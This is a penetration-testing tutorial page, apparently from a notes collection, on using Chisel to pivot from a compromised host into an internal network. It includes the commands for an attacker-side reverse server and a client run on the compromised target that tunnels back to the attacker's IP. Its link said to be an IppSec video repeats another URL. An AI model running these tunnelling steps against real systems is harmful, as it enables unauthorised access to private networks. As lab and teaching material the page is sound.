# Chisel
[Chisel](https://github.com/jpillora/chisel) is a great tool for pivoting and creating tunnels to internal networks and systems from a compromised target. It can be uploaded using [various data infiltration techniques](https://github.com/weaknetlabs/Penetration-Testing-Grimoire/blob/master/Post%20Exploitation/data-exfiltration-infiltration.md)

The practice of tunneling is very abstract and somewhat of an advanced topic in Information Security/IT. If any of this is confusing I would highly recommend watching tutorial videos on the subject which outline the process visually before attempting it.
## Chisel Usage by Example
Youtube user IppSec has a [great tutorial](https://github.com/weaknetlabs/Penetration-Testing-Grimoire/blob/master/Post%20Exploitation/data-exfiltration-infiltration.md) on how to use Chisel as a tunnel to pvito to internal systems from a compromised system. We will descirbe the entire process with 3 hosts, Attacker, which is our Kali system, the Target which is the compromised host, and the Internal Target, which lies on an internal netework that only the compromised Target system has access to communicate with.

Below are the steps outlined in the tunnel process,
1. Compromise a system as any level shell
   1. This does not have to be a root user
   2. This requires a space to read/write on the host to perform data infiltration.
2. Upload Chisel to the target host.
    1. Use simple data infiltration techniques that I have [outlined here.](https://github.com/weaknetlabs/Penetration-Testing-Grimoire/blob/master/Post%20Exploitation/data-exfiltration-infiltration.md)
    2. Ensure the binary tranferred successfully by using `md5sum` or some other hashing mechanism.
3. Start the Chisel server on the Attacker machine.
4. Start the Chisel client on the compromised Target system and connect back to the Attacker system's server.

### Starting the Chisel Server (Step 3)
To start the Chisel server on the Attacker machine, we do,
```
root@attacker-machine:~# chisel server -p 8081 -reverse -v
```
### Chisel Client on Compromised Target (Step 4)
To connect back to the Attacker machine from the compromised Target system, we run (on the compromised Target system)
```
user@target-machine:~$ ./chisel client \
 (ATTACKER IP ADDRESS):(ATTACKER PORT) R:(ATTACKER NEW PORT):(INTERAL TARGET IP):(INTERNAL TARGET PORT)
```
For instance, since we have the server running on the attacker system (10.10.14.2) from step 3 - at port 8081, we do (from the compromised target system (10.10.10.94)),
```
user@target-machine:~$ ./chisel client 10.10.14.2:8081 R:8082:172.19.0.3:80
```
This will route traffic to the internal Target system's port 80 via the compromised Target's reverse `R` connection to the Attacker host's Chisel server. Now, if all goes well, we can make a `curl` request from the Attacker machine to it's localhost on port 8082 and see the webpage located on the Internal Target Host, 172.19.0.3, via the compromised Target system, 10.10.10.94. Below is an ASCII visualization of the process of the HTTP request,

```
Attacker System-->compromised Target System-->Internal Private Network and Systems
10.10.14.2-->10.10.10.94-->172.19.0.3
172.19.0.3-->10.10.10.94-->10.10.14.2
```
